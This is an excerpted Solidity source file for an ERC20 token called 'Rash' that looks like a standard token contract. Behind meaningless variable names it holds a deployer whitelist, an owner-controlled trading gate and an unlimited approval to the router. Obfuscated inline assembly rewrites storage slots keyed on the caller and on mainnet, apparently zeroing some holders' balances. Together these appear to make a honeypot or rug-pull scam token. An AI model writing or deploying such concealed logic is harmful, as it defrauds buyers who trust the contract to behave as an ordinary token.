...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRash;
    uint256 private rashRush = block.number*2;

    mapping (address => bool) private _firstFly; 
    mapping (address => bool) private _secondPlane;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private spaceTrek;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private danceSong;
    address public pair;
    ...
    bool private trading; uint256 private reBorn = 1; bool private newTrick;
    uint256 private _decimals; uint256 private adaptOk;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRash.push(_router); addRash.push(msgSender_); addRash.push(pair);
        for (uint256 q=0; q < 3;) {_firstFly[addRash[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe6a5dcb0e7eb96a42b03b494da5a6409dc097c66c0fb4f9729e3ea9707fe3ce1
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x3bc567f982308a5daf3f3f876dd247b9b789fab94da9ff583908bdc33dc45643,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; rashRush = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRash[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployRash(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addRash[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRash(creator, initialSupply);
    }
}

contract Rash is ERC20Token {
    constructor() ERC20Token("Rash", "RASH", msg.sender, 25000000 * 10 ** 18) {
    }
}